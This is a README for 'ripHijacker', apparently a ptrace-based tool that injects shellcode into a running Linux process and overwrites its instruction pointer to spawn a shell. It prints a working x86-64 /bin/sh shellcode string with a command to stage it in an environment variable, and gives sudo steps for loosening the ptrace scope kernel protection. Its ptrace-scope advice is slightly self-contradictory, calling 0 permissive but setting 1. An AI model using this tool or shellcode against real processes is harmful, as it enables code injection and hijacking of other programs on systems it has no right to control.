# ripHijacker
                       
Usage: ./ripHijacker -p target_pid [-e environment_variable -n target_program_name]

-------------------------------------------------------------------------------------------------------------------------

./ripHijacker -p target_pid

..allow you to inject an hardcoded "/bin/sh" shellcode into the stack of the target and to overwrite its rip register with the address pointed by its rsp register.
-------------------------------------------------------------------------------------------------------------------------

./ripHijacker -p target_pid -e environment_variable -n target_program_name 

..allow you to overwrite the register rip of the target with the address of the environment variable (specified with -e option) in the target's stack.
-------------------------------------------------------------------------------------------------------------------------
We can load a simple shellcode in an environment variable with the command:

export A=$(python -c "print '\xeb\x1f\x5f\x48\x31\xc0\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\x48\x31\xff\x48\x83\xc0\x7f\x48\x83\xc0\x2d\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'")

ripHijacker uses ptrace. "A PTRACE scope of "0" is the more permissive mode.  A scope of "1" limits
PTRACE only to direct child processes", so we can change scope of ptrace with these commands:

sudo vim  /etc/sysctl.d/10-ptrace.conf

..and setting.. 

kernel.yama.ptrace_scope = 1

..after that we must load the new settings with:

sudo sysctl --system -a -p | grep  yama

Obviously the target program must be compiled with the "-z execstack" option.

Acknowledgment:

  Vorrei ringraziare Fabio Blacklight ed il suo vecchio ma geniale programma meminj.c che mi ha permesso di venire a 
  conoscenza dell'utilità di ptrace.




